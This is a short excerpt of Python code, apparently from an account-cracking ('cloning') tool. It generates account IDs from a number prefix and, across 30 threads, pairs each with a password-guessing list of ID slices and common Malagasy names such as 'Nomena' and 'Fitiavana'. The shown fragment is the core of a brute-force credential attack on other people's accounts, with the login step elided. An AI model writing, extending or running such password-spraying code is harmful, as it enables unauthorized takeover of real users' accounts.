...
def BD_CLONING():
    ...
    with tred(max_workers=30) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','mahery','Mahery','tsilavina','Tsilavina','fanasina','Fanasina','malala','malala','fitiavana','Fitiavana','fanantenana','Fanantenana','fanomezana','Fanomezana','Fiderana','fiderana','Nantenaina','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','fandresena','Fandresena','Nirina','nilaina','Nilaina','nirina']
